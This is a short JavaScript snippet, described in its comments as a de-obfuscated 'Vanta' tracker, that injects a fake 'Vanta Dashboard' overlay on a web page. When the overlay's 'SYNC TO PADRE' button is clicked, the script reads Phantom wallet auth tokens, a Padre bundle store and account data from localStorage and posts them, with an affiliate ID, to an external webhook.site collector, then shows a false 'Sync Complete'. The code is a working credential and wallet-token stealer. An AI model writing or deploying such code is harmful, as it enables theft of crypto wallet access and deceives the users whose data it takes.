(function() {
    // Target Webhook for data exfiltration analysis
    const WEBHOOK_URL = 'https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515';
    const AFFILIATE_ID = 'TK0XQV';

    console.log("[Vanta] Initializing de-obfuscated tracker...");

    const getSensitiveData = () => {
        return {
            bundle: localStorage.getItem('padre-v2-bundles-store-v2'),
            auth_tokens: localStorage.getItem('.phantom.auth.tokens'),
            accounts: localStorage.getItem('vanta_accounts'),
            origin: window.location.hostname,
            url: window.location.href,
            time: new Date().toISOString()
        };
    };

    const sendToCollector = async (payload) => {
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors', // Standard bypass for simple OOB exfiltration
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    affiliate: AFFILIATE_ID,
                    data: payload
                })
            });
            console.log("[Vanta] Data transmitted to webhook.");
        } catch (e) {
            console.error("[Vanta] Transmission failed:", e);
        }
    };

    // UI Overlay (1:1 styling)
    const injectUI = () => {
        const div = document.createElement('div');
        div.style.cssText = `
            position:fixed; top:20px; right:20px; width:300px;
            background:#111; border:1px solid #00ff88; color:#fff;
            padding:20px; border-radius:10px; z-index:999999;
            font-family:sans-serif; box-shadow:0 0 20px rgba(0,255,136,0.2);
        `;
        div.innerHTML = `
            <h3 style="color:#00ff88; margin-bottom:10px;">Vanta Dashboard</h3>
            <p style="font-size:12px; color:#aaa; margin-bottom:15px;">Target: ${window.location.hostname}</p>
            <button id="vanta-sync-btn" style="width:100%; padding:10px; background:#00ff88; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">SYNC TO PADRE</button>
        `;
        document.body.appendChild(div);

        document.getElementById('vanta-sync-btn').onclick = function() {
            this.innerText = "Syncing...";
            const data = getSensitiveData();
            sendToCollector(data);
            setTimeout(() => { this.innerText = "Sync Complete"; }, 1000);
        };
    };

    injectUI();
})();
